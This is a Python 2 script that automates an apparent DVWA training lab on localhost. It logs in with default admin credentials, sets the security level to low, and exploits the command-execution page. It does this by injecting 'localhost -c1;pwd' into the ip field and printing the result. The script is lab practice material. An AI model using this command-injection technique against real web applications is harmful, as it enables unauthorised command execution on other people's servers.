from HTMLParser import HTMLParser
import requests
from time import sleep

base_url = 'http://localhost:8008'
setup_url = base_url + '/setup.php'
login_url = base_url + '/login.php'
security_url = base_url + '/security.php'
exec_url = base_url + '/vulnerabilities/exec/'

headers = {
    'host': 'localhost:8008',
    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0)',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'close'
}


def make_cookie(response_headers):
    if 'Set-Cookie' in response_headers:
        temp = response_headers['Set-Cookie']
        return '; '.join(set([x for x in temp.replace(';', '').replace(',', '').split(' ') if
                              x.startswith("PHPSESSID") or x.startswith("security")]))
    else:
        return ''


def update_cookies(headers, response):
    cookies = make_cookie(response.headers)
    if cookies:
        headers['Cookie'] = cookies


def set_low_security_level(headers):
    if 'Cookie' in headers:
        headers['Cookie'] = headers['Cookie'].replace('impossible', 'low')


class InputFieldsSelector(HTMLParser):
    inputs = {}
    order = []

    def handle_starttag(self, tag, attrs):
        if tag == 'input':
            temp_dict = {key: value for key, value in attrs if key in ('name', 'value')}
            if 'name' in temp_dict:
                self.inputs[temp_dict['name']] = temp_dict['value'] if 'value' in temp_dict else None
                self.order.append(temp_dict['name'])
                # for key in temp_dict:
                #     self.inputs[key] = temp_dict[key] if temp_dict[key] else None
                #     self.order.append(key)

    def set_credentials(self, username, password):
        self.inputs['username'] = username
        self.inputs['password'] = password

    def set_input(self, key, value):
        self.inputs[key] = value
        if key not in self.order:
            self.order.append(key)

    def remove_key(self, key):
        if key in self.inputs:
            del self.inputs[key]
        if key in self.order:
            self.order.remove(key)

    def get_inputs(self):
        return '&'.join(['{}={}'.format(key, self.inputs[key]) for key in self.order])
        # return '&'.join(['{}={}'.format(key, value) for key, value in self.inputs.items()])

    def clear(self):
        self.order = []
        self.inputs = {}


class RCEResult(HTMLParser):
    printable = False

    def handle_starttag(self, tag, attrs):
        if tag == 'pre':
            self.printable = True

    def handle_data(self, data):
        if self.printable:
            print data

    def handle_endtag(self, tag):
        if tag == 'pre':
            self.printable = False


# SETUP #
print "# SETUP #"
response = requests.get(setup_url, headers=headers)
parser = InputFieldsSelector()
parser.feed(response.text)
update_cookies(headers, response)
print parser.get_inputs()
response = requests.post(setup_url, parser.get_inputs(), headers=headers)
update_cookies(headers, response)

# LOGIN #
print '# LOGIN #'
response = requests.get(login_url, headers=headers)
update_cookies(headers, response)
parser.clear()
parser.feed(response.text)
parser.set_credentials('admin', 'password')
print parser.get_inputs()
response = requests.post(login_url, parser.get_inputs(), headers=headers)
update_cookies(headers, response)

# SET SECURITY LEVEL #
print '# SET SECURITY LEVEL #'
response = requests.get(security_url, headers=headers)
update_cookies(headers, response)
parser.clear()
parser.feed(response.text)
parser.set_input('security', 'low')
print parser.inputs
response = requests.post(security_url, parser.get_inputs(), headers=headers)
update_cookies(headers, response)
set_low_security_level(headers)

# RCE #
print '# RCE #'
response = requests.get(exec_url, headers=headers)
update_cookies(headers, response)
parser.clear()
parser.feed(response.text)
parser.set_input('ip', 'localhost -c1;pwd')
print parser.get_inputs()
print headers['Cookie']
response = requests.post(exec_url, parser.get_inputs(), headers=headers)
print '============================='
RCEResult().feed(response.text)
